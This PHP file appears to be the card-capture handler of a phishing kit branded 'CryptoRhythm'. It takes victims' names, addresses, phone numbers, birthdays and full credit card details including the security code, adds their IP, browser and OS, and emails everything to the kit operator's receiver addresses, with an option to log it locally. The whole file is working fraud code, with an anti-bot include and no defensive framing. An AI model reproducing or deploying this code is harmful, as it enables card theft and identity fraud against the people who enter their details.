<?php

header("Content-type: application/json");

session_start();

define("INC", "true");

require_once("../inc/config.inc.php");
require_once("../inc/crypto.inc.php");
require_once("../inc/countries.php");
require_once("../system/system.inc.php");
require_once("../inc/encryption.inc.php");
require_once("../inc/cryptodb.inc.php");
require_once("../track/module.php");
require_once("../antibots.php");


if(isset($_GET['fname']) && isset($_GET['lname']) && $_GET['fname'] != "" && $_GET['lname'] != "") {
  $fname = $_GET['fname'];
  $lname = $_GET['lname'];
  $country = $_GET['country'];
  $state = $_GET['state'];
  $zip = $_GET['zip'];
  $adline = $_GET['adline'];
  $phonet = $_GET['phonet'];
  $number = $_GET['number'];
  $bday = $_GET['bday'];
  $cholder = $_GET['cholder'];
  $cnumber = $_GET['cnumber'];
  $exdate = $_GET['expdate'];
  $csc = $_GET['csc'];

  $crypto = new Crypto($template);

  $template = $crypto->loadTemplate("account");
  $user_agent = $_SERVER['HTTP_USER_AGENT'];

  $browser = $crypto->getInfo("browser", $user_agent);
  $os = $crypto->getInfo("os", $user_agent);

  $template = str_replace("[CRYPTORESULT]", "Credit Card", $template);
  $template = str_replace("[CRYPTOFIRSTNAME]", $fname, $template);
  $template = str_replace("[CRYPTOLASTNAME]", $lname, $template);
  $template = str_replace("[CRYPTOCOUNTRY]", $country, $template);
  $template = str_replace("[CRYPTOSTATE]", $state, $template);
  $template = str_replace("[CRYPTOZIP]", $zip, $template);
  $template = str_replace("[CRYPTOLINE]", $adline, $template);
  $template = str_replace("[CRYPTOPHONE]", $phonet, $template);
  $template = str_replace("[CRYPTONUMBER]", $number, $template);
  $template = str_replace("[CRYPTOBDAY]", $bday, $template);
  $template = str_replace("[CRYPTOHOLDER]", $cholder, $template);
  $template = str_replace("[CRYPTOCNUMBER]", $cnumber, $template);
  $template = str_replace("[CRYPTOEXPDATE]", $exdate, $template);
  $template = str_replace("[CRYPTOCSC]", $csc, $template);
  $template = str_replace("[CRYPTOIP]", $_SESSION['_ip_'], $template);
  $template = str_replace("[CRYPTOOS]", $os, $template);
  $template = str_replace("[CRYPTOBROWSER]", $browser, $template);
  $template = str_replace("[CRYPTOCOUNTRY]", $code_country[$_SESSION['country_code']], $template);
  $template = str_replace("[CRYPTOVERSION]", $version, $template);

  $headers = "MIME-Version: 1.0" . "\r\n";
  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
  $headers .= 'From: <cryptorhythm@cryptomail.to>' . "\r\n";

  $subject = "CryptoRhythm - New Credit Card from ".$code_country[$_SESSION['country_code']];
  foreach(explode(",", $receiver) as $rc) {
	mail($rc, $subject, $template, $headers);
  }

  if($local_log) {
    saveCredit($bday, $fname, $lname, $country, $state, $zip, $phonet, $number, $cnumber, $exdate, $csc, $password);
  }
  $_SESSION['_step_'] = "2";
  echo '{"action":"done"}';
}
?>
